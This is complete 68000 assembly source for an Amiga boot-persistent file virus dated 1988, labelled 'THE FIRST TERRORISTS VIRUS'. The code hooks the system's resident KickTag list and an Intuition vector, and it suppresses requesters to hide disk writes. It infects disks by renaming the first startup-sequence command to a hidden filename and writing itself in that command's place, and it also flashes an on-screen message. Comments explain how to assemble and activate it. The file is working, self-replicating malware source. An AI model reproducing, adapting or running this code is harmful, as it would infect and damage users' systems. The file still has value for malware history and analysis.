;*----- THE FIRST TERRORISTS VIRUS!  1988-09-17 -----*
;-----------------------------------------------------
; FINAL VERSION (SWITCHS OFF REQUESTERS!)
; FILE NAME = $a0202020a02020a020a0a0				
;  virus structure: base-> 4kb border +8
;	offset	  part		length
;	    0 >	resident header	  26
;	   26 >	resident list	  8
;	   34 >	memory node	  24
;	   58 >	nothing		  14
;	lynch >	start hunks	  20
;		program body	  ? 
;		end hunks	  4
;					
; CLI execution starts 	at CLI
; reset init 		at rt_init
; copy routine		at action
; **** TO ACTIVATE VIRUS ASSEMBLE AND ENTER 'J'  ****
; ----------------------------------------------------
;				
align 4				
cli:				
 movem.l d0-d7/a0-a2/a4-a6,-(a7);a3 is start pointer!
 lea store3(pc),a0		;
 move.l a3,(a0)			; save segment pointer
				
; ##### search resident 1988-09-04 by AMICOM & DEPECHE
; returns ne= pointer to module; equal =not found
				
 move.l 4.w,a6			;
srcres:				
 move.l 550(a6),d7		; D7 =KickTag
 beq.s mr_empty			;
 move.l d7,a2			; a2 =list search pointer
mr_noname:			
mr_srcname:			
 move.l (a2)+,d1		;
 bmi.s mr_link			; found a link
 beq.s mr_endlist		; end of list
 move.l d1,a1			;
 move.l 14(a1),d0		; get name pointer
 beq.s mr_noname		;
 bsr.s mr_cmpname		; compare names
 bne.s mr_srcname		; not equal ->
mr_foundit:			
 tst.l d1			; 'exists' module start
 bra.s mr_exit			;
				
mr_link:			
 bclr #31,d1			;
 move.l d1,a2			; take link
 bra.s mr_srcname		;
				
mr_cmpname:			
 move.l d0,a3			;
 cmp.l #virusrname,(a3)		;
 rts				;
				
mr_endlist:			
mr_empty:			
 moveq #0,d1			; 'not found' flag
				
mr_exit:			; if found, a1=base
				
 bne.L inmem			; already in memory
	move.l #4096+alloclen,d0	;for file,sseq,pic plane
	moveq #2,d1			;CHIP
	jsr -198(a6)			;AlocMem
	add.l #4096,d0			;add 4 kbytes to base
	and.w #%1111000000000000,d0	;to bottom of 4kb border
	addq.l #8,d0			;skip shit HQC longword
				
makeres:			
 tst.l d7			; old KickTag empty?
 beq.s mr_oldempty		;
 bset #31,d7			; make old KickTagPt link
mr_oldempty:			
 move.l d0,a0			;
 lea endskip-cli+lynch+len_sh(a0),a2	; pointer to end of prog
 lea rname-cli+lynch+len_sh(a0),a3	; pointer to name
 lea rt_init-cli+lynch+len_sh(a0),a4	; pointer to init routine
				
 move.w #$4afc,(a0)+		; *** MAKE RESIDENT HEADER ***
 move.l d0,(a0)+		; rt_MatchTag
 move.l a2,(a0)+		; rt_EndSkip
 move.l #$010100c5,(a0)+	; flags,version,type,pri
 move.l a3,(a0)+		; rt_name
 clr.l (a0)+			; no shit IdString
 move.l a4,(a0)+		; rt_init *** END OF RES. HEADER
				
 move.l a0,550(a6)		; set KickTag
 move.l d0,(a0)+		; *** RESIDENT LIST
 move.l d7,(a0)+		; set link
				
; ******  INSTALL MEMORY LIST ******	
 move.l 546(a6),d1		; get KickMemPt (to first node)
 move.l a0,546(a6)		; point to new node
 move.l d1,(a0)+		; point node_next to old
 clr.l (a0)+			; node_previous not used
 move.w #$0af0,(a0)+		; type=mem, pri=-16
 move.l a3,(a0)+		; name pt
 move.w #1,(a0)+		; ML node_numentries
 move.l d0,(a0)+		;	 _start
 move.l #alloclen,(a0)+		;	 _len
 move.l d0,a1			;
 jsr -612(a6)			; SumKick
 move.l d0,554(a6)		; set sum
					
	lea lynch(a1),a4		;offset allocbase to hunks
	lea shunks(pc),a0		;source
	moveq  #len_sh-1,d0		;len
copy:	move.b (a0)+,(a4)+		; copy start HUNKs
	dbf    d0,copy			;
					
	lea cli(pc),a2			;
	move.w #vlen-1,d0		;len of virus body
copy3:	move.b (a2)+,(a4)+		;copy PROG
	dbf    d0,copy3			;
					
	move.l (a0)+,(a4)+		; copy end HUNKs
					
; **** A1 =module base ***		
inmem:					
;jmp jumpin-cli+len_sh+lynch(a1)	; A0 =module base
					
jumpin:	lea dosname(pc),a1		;
	moveq #0,d0			;
	jsr -552(a6)			; open dos
	tst.l d0			;
	beq.L lserr1			;
	move.l d0,a6			; DOSbase
	lea virusfname(pc),a1		;
	move.l a1,d1			;
	jsr -150(a6)			; loadseg
	beq.s lserr2			;
	lea back(pc),a0			;
	lea store1(pc),a1		;
	move.l 56(a7),(a1)+		; save return address
	move.l a0,56(a7)		; repoint return add
	move.l d0,(a1)+			; save segment pointer
	move.l a6,(a1)+			; dosbase
	lsl.l #2,d0			; make pointer
	move.l d0,a3			; file start address
runend:	movem.l (a7)+,d0-d7/a0-a2/a4-a6	;
	jmp 4(a3)			; execute command
					
back:	lea store1(pc),a5		;
	move.l (a5)+,-(a7)		; return address
	move.l (a5)+,d1			; segment pointer
	move.l (a5)+,a6			; dosbase
	move.l d0,-(a5)			; save error status
	jsr -156(a6)			; unload segment [d1]
	move.l a6,a1			; dosbase
	move.l 4.w,a6			;
	jsr -414(a6)			; closeDos
	move.l (a5)+,d0			; get error status
	move.l (a5)+,a3			; store3 =CLI cmd base pt
	rts				;
					
lserr2:	move.l a6,a1			; LoadSegment failed
	move.l 4.w,a6			;
	jsr -414(a6)			; close DOS
lserr1:	movem.l (a7)+,d0-d7/a0-a2/a4-a6	;
	move.l store3(pc),a3		; restore segment pt
	rts				; exit without execute
 					
; **** THIS SPACE MUST BE INSIDE THE BODY BECAUSE ****
; **** WHEN RUN FROM CLI THERE'S  NO ROOM OUTSIDE ****
store1: dc.l 0				; store for return address
	dc.l 0				; 	segment pt
	dc.l 0				;	dosbase / error
store3: dc.l 0				;  for cmd (segment) pt
					
rt_init: movem.l d0-d7/a0-a6,-(a7)	;***FindRes
	lea    intname(pc),a1		;
	move.l 4.w,a6			;
	moveq  #0,d0			;
	jsr    -552(a6)			; open intuition
	move.l d0,a1			;
	lea    action(pc),a0		;
	lea    2+oldvec(pc),a2		;
	move.l -202(a1),(a2)		; get action vector
	move.l a0,-202(a1)		; change it !!!
	jsr -414(a6)			; close it
	movem.l (a7)+,a0-a6/d0-d7	;
	rts				;
					
process:	dc.l 0			
oldwindow:	dc.l 0			
					
action:	movem.l d0-d7/a0-a6,-(a7)	;
	move.l 4.w,a6			;
					
; **** REQUESTER OFF ****		
; HI, HERE'S ZODIAC, LEADER IN PRODUCING SHIT...
					
 off:	sub.l a1,a1			;
	jsr -294(a6)			;
	move.l d0,a0			;
	lea process(pc),a1		;
	move.l d0,(a1)+			;
	move.l 184(a0),(a1)		; save old pt
	move.l #-1,184(a0)		; requester off
;-------				
	lea    dosname(pc),a1		;
	moveq #0,d0			;
	jsr    -552(a6)			; open doslib
	move.l d0,a6			;
	lea    virusfname(pc),a1	; already on disk?
	move.l a1,d1			;
	move.l #$03ed,d2		; open for read
	jsr    -30(a6)			;
	beq.s ondsk2			; not found => not on disk
	move.l d0,d1			;
	jsr    -36(a6)			; already there
	bra.s nosave			;  => don't save
ondsk2:	bsr.s  load			; 
;	beq.s nosave			; no startup-sequence
	bsr.L findn			; find first filename [a2]
					
ask_c:	move.l a2,d1			;
	move.l #$03ed,d2		; open for read
	jsr    -30(a6)			;
	bne.s rename			; in root dir
	move.w #"c/",-(a2)		; not in root => in c!
					
rename:	move.l a2,d1			; name of first file
	lea virusfname(pc),a1		;
	move.l a1,d2			;
	jsr -78(a6)			; rename shit !
	move.l a2,a1			; name for virus from sseq
	move.l #flen,d5			; virus file len
	lea cli-len_sh(pc),a5		;
	move.l a5,d6			; save base
	lea numcop(pc),a5		;
	addq.w #1,(a5)			; copies up
	bsr.s  save			; save shit!!!
	subq.w #1,(a5)			;
nosave:					
reqon:	move.l process(pc),a1		; requesters on again
	move.l oldwindow(pc),184(a1)	;
					
	move.l a6,a1			;
	move.l 4.w,a6			;
	jsr -414(a6)			; close DOS
	lea intname(pc),a1		;
	moveq #0,d0			;
	jsr -552(a6)			; open intuition
	move.l d0,a1			;
	move.l 2+oldvec(pc),-202(a1)	;restore action vector
	jsr -414(a6)			; close inituition
	bsr.L  top			;textroutine
	movem.l (a7)+,d0-d7/a0-a6	;
oldvec:	jmp 0				;
					
load:	lea    sseqname(pc),a1		;
	move.l a1,d1			;
	move.l #$03ed,d2		;
	jsr    -30(a6)			; open
	beq.s dskerr			;
	lea space+40(pc),a4		; free space for sseq
	move.l a4,d2			;
	move.l #2047,d3			; max len of sseq
	move.l d3,d4			;
clrspc:	clr.b (a4)+			; clear space
	dbf d4,clrspc			;
	move.l d0,d1			;
	move.l d0,d4			;
	jsr    -42(a6)			; load
	beq.s dskerr			;
	move.l d0,d5			;
cl:	move.l d4,d1			;
	jsr    -36(a6)			;
dskerr:	rts				; disk error
					
save:	move.l a1,d1			;filename
	move.l #$03ee,d2		;
	jsr    -30(a6)			;
	beq.s  dskerr			; open failed
	move.l d0,d1			;
	move.l d0,d4			;
	move.l d5,d3			;filelen
	move.l d6,d2			;buffer
	jsr    -48(a6)			;
	bra.s  cl			;
					
;*------- Find first filename in startup-sequence -------*
				
findn:	lea space+40(pc),a0	;startup-sequence
	lea space+4(pc),a1	;
	move.l a1,a2		;
fn_1:	tst.b (a0)		;
	beq.s fn_end		; empty sseq
	cmp.b  #$20,(a0)	;
	bne.s  return		;
	addq   #1,a0		;
	bra.s  fn_1		;
				
return:	tst.b (a0)		;
	beq.s fn_end		; end of sseq
	cmp.b  #$0a,(a0)+	;
	beq.s  fn_1		;
	subq   #1,a0		; filename start
comment:cmp.b  #";",(a0)	;
	beq.s  skip		;
quot:	cmp.b #'"',(a0)		;
	beq.s quot1		;
found:	cmp.b  #$0a,(a0)	; copy name and find end
	beq.s  fn_end		;
	cmp.b  #" ",(a0)	;
	beq.s  fn_end		;
	move.b (a0)+,(a1)+	;
	bra.s  found		;
fn_end:	clr.b (a1)+		;
	rts			;
				
skip:	tst.b (a0)+		; end of sseq? 
	beq.s fn_end		;
	cmp.b  #$0a,(a0)+	; skip comment
	bne.s  skip		;
	bra.s  fn_1		;
				
quot1:	addq #1,a0		;
quot2:	cmp.b #'"',(a0)		; copy name and find end
	beq.s fn_end		;  (second quot)
	move.b (a0)+,(a1)+	;
	bra.s quot2		;


;������ Textroutine
noshow:	rts				
top:	lea    $dff000,a5		;
move.b $bfe801,d0
top_w1:	cmp.b $bfe801,d0
beq.s top_w1
	cmp.b #10,7(a5)			; horiz pos
	bhi.s  noshow			; show text?
	lea gfxname(pc),a1		;
	moveq #0,d0			;
	jsr -552(a6)			; open GFX
	tst.l d0			;
	beq.s noshow			;
	move.l d0,a1			;
	lea data(pc),a2			;
	lea space(pc),a3		;
	move.l a3,d0			;
	move.w d0,cl_ppL-data(a2)	;
	swap d0				;
	move.w d0,cl_ppH-data(a2)	;
	clr.w  cl_col-data(a2)		; start black
	move.l 50(a1),-(a7)		; save old LOFlist
	move.l a1,-(a7)			;  and GFX base
	move.l a2,50(a1)		; install clist
	addq.w #1,numstx-data(a2)	; add one shown text
nospr:	btst #0,5(a5)			;
	bne.s nospr			;
	cmp.b #$1a,6(a5)		;
	bne.s nospr			;
	move.w #$0020,$96(a5)		;sprite dma off
					
	lea    text(pc),a4		;
again:	lea    space(pc),a3		;position of letter
	move.l a3,a0			;clear screen
	move.w #7*40-1,d0		;
kill:	clr.b  (a0)+			;
	dbf    d0,kill			;
	moveq  #0,d0			;
	move.b (a4)+,d0			;
	cmp.b  #$ff,d0			;end of text?
	beq.s  end2			;
	add.w  d0,a3			;
loop:	move.l a3,a1			
	moveq  #0,d0			
	move.b (a4)+,d0			
	cmp.b  #$fe,d0			
	beq.s  ready			
	mulu   #7,d0			
	lea    font(pc),a0		;font start
	add.w  d0,a0			;
	moveq  #6,d0			;high
copy2:	move.b (a0)+,(a1)		
	add.w  #$28,a1			
	dbf    d0,copy2			
	addq   #1,a3			
	bra.s  loop			
					
ready:	moveq  #$0,d0			
	move.w #$0111,d2
	move.w #$0900,d5		;cycle delay
	bsr.s  cycle			
	move.w #$0fff,d0		
	move.w #$0eef,d2
	move.w #$0200,d5		
	bsr.s  cycle			
	bra.s  again			
;----------				
end2:	move.w #$c020,$96(a5)		; sprites on
	move.l (a7)+,a1			; GFX base
	move.l (a7)+,50(a1)		; copperlist
	rts				
					
cycle:	moveq  #$0f,d1			; *** Dawnroutine
dawn:	move.w d0,cl_col-data(a2)	; set color
		add.w  d2,d0
		and.w  #$0fff,d0
	moveq  #$14,d3			
	bsr.s  wait			
	dbf    d1,dawn			
	move.w d5,d3			
wait:	cmp.b  #$ff,$06(a5)		
	bne.s  wait			
	dbf    d3,wait			
	rts				
					
data:
numcop:	dc.w 1433			;number of copies
numstx:	dc.w 1125			;number of shown texts
clist:	dc.w $0102,$0000
	dc.w $0108,$0000
	dc.w $008e,$8081
	dc.w $0090,$87c1
	dc.w $0092,$0038
	dc.w $0094,$00d0
	dc.w $0180,$0000
	dc.w $0182
cl_col:	dc.w 0
	dc.w $0100,$1200
	dc.w $00e0
cl_ppH: dc.w 0
	dc.w $00e2
cl_ppL:	dc.w 0
	dc.w $ffff,$fffe
			
font:	dc.b $02,$06,$0a,$12,$22,$7e,$82,$78,$84,$f8,$84,$82
	dc.b $82,$fc,$7e,$80,$80,$80,$80,$80,$7e,$f8,$84,$82
	dc.b $82,$82,$82,$fe,$7e,$80,$80,$fe,$80,$80,$7e,$7e
	dc.b $80,$80,$fe,$80,$80,$80,$7e,$80,$80,$9e,$82,$82
	dc.b $7e,$82,$82,$82,$fe,$82,$82,$82,$fe,$00,$10,$10
	dc.b $10,$10,$fe,$80,$80,$80,$80,$80,$80,$7e,$fc,$82
	dc.b $92,$92,$92,$92,$92,$82,$c2,$a2,$92,$8a,$86,$82
	dc.b $7c,$82,$82,$82,$82,$82,$7c,$7c,$82,$82,$fc,$80
	dc.b $80,$80,$7c,$82,$82,$fc,$88,$84,$82,$78,$80,$80
	dc.b $7c,$02,$02,$fc,$fe,$00,$10,$10,$10,$10,$10,$82
	dc.b $82,$82,$82,$82,$82,$7c,$82,$84,$88,$90,$a0,$c0
	dc.b $80,$82,$82,$92,$92,$92,$92,$7e,$82,$82,$82,$7c
	dc.b $10,$10,$10,$fe,$f8,$e0,$80,$00,$00,$80,$00,$00
	dc.b $00,$00,$00,$00,$92,$00,$00,$00,$00,$00,$00,$00
			
text:	dc.b 6,16,7,4,23,11,0,10,4,15,23,7,0,18,4,23,1,4,4,11
	dc.b 23,2,7,0,11,6,4,3,$fe
	dc.b 7,16,12,23,13,14,12,16,4,2,16,23,16,7,4,23
	dc.b 8,11,11,12,2,4,11,16,22,$fe
	dc.b 1,16,7,4,23,16,4,14,14,12,14,8,15,16,15,23
	dc.b 7,0,18,4,23,20,12,17,23,17,11,3,4,14,23
	dc.b 2,12,11,16,14,12,9,$fe
	dc.b 8,4,18,4,14,20,16,7,8,11,6,23,8,15,23
	dc.b 3,4,15,16,14,12,20,4,3,$fe
	dc.b 8,20,12,17,14,23,15,20,15,16,4,10,23,8,15,23
	dc.b 8,11,5,4,2,16,4,3,$fe
	dc.b 3,16,7,4,14,4,23,8,15,23,11,12,23,7,12,13,4,23
	dc.b 5,12,14,23,1,4,16,16,4,14,23,16,8,10,4,15,$fe
	dc.b 5,16,7,4,23,5,8,14,15,16,23,16,4
	dc.b 14,14,12,14,8,15,16,15,23
	dc.b 18,8,14,17,15,23,21,21,21,$fe
	dc.b $ff

; A=0  B=1  C=2  D=3  E=4  F=5  G=6  H=7  I=8
; L=9  M=10 N=11 O=12 P=13 R=14 S=15 T=16 U=17
; V=18 W=19 Y=20 !=21 .=22  =23

dosname:	dc.b 'dos.library',0
intname:	dc.b 'intuition.library',0
gfxname:	dc.b 'graphics.library',0
sseqname:	dc.b 'sys:s/startup-sequence',0
virusfname:	dc.b 'sys:',$a0,$20,$20,$20,$a0,$20,$20
		dc.b $a0,$20,$a0,$a0,0
;even
rname:		dc.b "TTV1"

shunks:	dc.l $000003f3	; hunk header
	dc.l 0		; contents: none
	dc.l 1		; number of hunks in list
	dc.l 0,0	; ???
	dc.l vlen/4	; len of code
	dc.l $3e9	; hunk type: code
	dc.l vlen/4	;
len_sh=$20		
len_eh=4		
ehunks:	dc.l $3f2	;
			
align 4			
end:	dc.l 0		; space for end hunks
endskip:		
space:			
			
virusrname="TTV1"
lynch=60			; offset module base to hunks
alloclen=4*1024-8
vlen=end-cli			; virus prog len
flen=vlen+len_sh+len_eh		; virus file len
